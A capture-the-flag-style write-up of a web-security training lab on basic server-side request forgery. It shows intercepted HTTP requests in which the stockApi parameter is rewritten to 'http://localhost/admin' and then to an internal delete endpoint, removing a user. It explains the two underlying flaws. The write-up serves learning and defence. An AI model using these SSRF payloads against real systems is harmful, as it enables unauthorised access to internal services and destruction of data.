### Lab: Basic SSRF against the local server
---
#### Objective: Change the stock check URL to access the admin interface at 'http://localhost/admin' and delete the user carlos. 
**Tools Used**
Burpsuite Community Edition - Proxy Interceptor
**Solving Steps**   
Opening the website, I navigated to one of the item and toggled the interceptor from Burpsuite. After toggling the interceptor, I clicked on check stock to intercept the POST request sent by the client. From here, I modified the API called by the client to the admin panel [shown below]:
**Before**
```
POST /product/stock HTTP/2
Host: 0a160032032ccd91809785a5001a0063.web-security-academy.net
...

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```
**After**
```
POST /product/stock HTTP/2
Host: 0a160032032ccd91809785a5001a0063.web-security-academy.net
...

stockApi=http://localhost/admin
```
Now when we try to delete the user 'carlos' direclty from the admin panel, we find out that we are not allowed to. However, if we pay attention to the request sent when trying to delete the user, we can see that the delete api is called. 
```
GET /admin/delete?username=carlos
```
Now we could go back to the first step of the lab, but rather calling the localhost admin panel, we swap it out for the delete endpoint.  

After swapping out for the delete endpoint, we end up with this request:
```
POST /product/stock HTTP/2
Host: 0a160032032ccd91809785a5001a0063.web-security-academy.net
...

stockApi=http://localhost/admin/delete?username=carlos
```
After this, we have successfully deleted the target user. This tells us that the server allows us to call privileged endpoints as localhost.  

---  
**The Problem**  
Looking into why when I tried to delete the target user character earlier and failed, I learn that it is because despite changing the header to localhost, it is in reality just a label. The server checks where the request comes from and it came from my computer rather than the localhost itself - so to the server, it is an outsider calling the request.  

This however, was different to why the stockApi paramaeter works. In the field, the server reads the URL and fetches a new request for you. This is a brand new connection, starting from the server itself. In other words, the connection really came from localhost and I tricked the server into being my messenger.  

---  
**Bugs Identified**  
- The stock-check feature takes in any URL without any validation, fetching any addresses, including internal ones
- The admin panel grants access based on where the request came from (localhost). Via SSRF, the request genuinely originates from localhost because the server sends it on my behalf, so the panel lets it through — and it enforces no additional authentication to prove the user is an admin.

---
**Date:** 2026-11-22 | **Status:** Solved